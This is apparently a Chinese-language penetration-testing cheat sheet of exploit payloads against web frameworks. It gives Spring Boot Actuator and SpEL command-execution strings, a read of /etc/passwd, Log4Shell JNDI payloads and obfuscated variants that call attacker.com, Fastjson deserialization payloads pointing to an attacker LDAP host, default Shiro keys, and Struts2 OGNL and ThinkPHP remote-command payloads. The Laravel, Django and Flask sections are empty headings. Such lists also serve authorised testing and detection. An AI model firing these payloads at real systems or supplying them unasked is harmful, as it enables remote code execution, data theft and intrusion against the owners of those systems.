# 框架漏洞

## 1. Spring Boot Actuator

### 端点探测

```
/actuator
/actuator/env
/actuator/health
/actuator/heapdump
/actuator/loggers
/actuator/refresh
/actuator/mappings
```

### 利用

```
# 获取环境变量
/actuator/env

# 触发RCE
/actuator/refresh
POST: {"name":"test","value":"#{T(java.lang.Runtime).getRuntime().exec('whoami')}"}
```

---

## 2. Spring SpEL注入

### 基础RCE

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### 读取文件

```
${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}
```

---

## 3. Log4j RCE (CVE-2021-44228)

### 基础Payload

```
${jndi:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

### 变形Payload

```
${jndi:rmi://attacker.com/Exploit}
${jndi:ldap://attacker.com/Exploit}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
```

---

## 4. Fastjson反序列化

### 基础Payload

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### JdbcRowSetImpl

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

---

## 5. Shiro反序列化

### RememberMe攻击

1. 常见密钥:
   - kPH+bIxk5D2deZiIxcaaaA==
   - 4AvVhmFLUs0KTA3KprsdGv==
   - etc.

### 利用工具

```bash
java -jar shiro-attack-2.0.jar
```

---

## 6. Struts2 RCE

### 基础Payload

```
%{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new java.lang.String(#e))}
```

---

## 7. ThinkPHP RCE

### 基础Payload

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

---

## 8. Laravel RCE

### .env文件泄露

### 密钥利用

```
php artisan tinker
```

---

## 9. WebLogic RCE

### XMLDecoder

```
POST /wls-wsat/CoordinatorPortType
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
...
```

---

## 10. JBoss反序列化

### 攻击路径

```
/invoker/JMXInvokerServlet
/admin-console
```

---

## 11. Django

### 任意文件读取

### SQL注入

---

## 12. Flask

### 模板注入

### Debug模式RCE
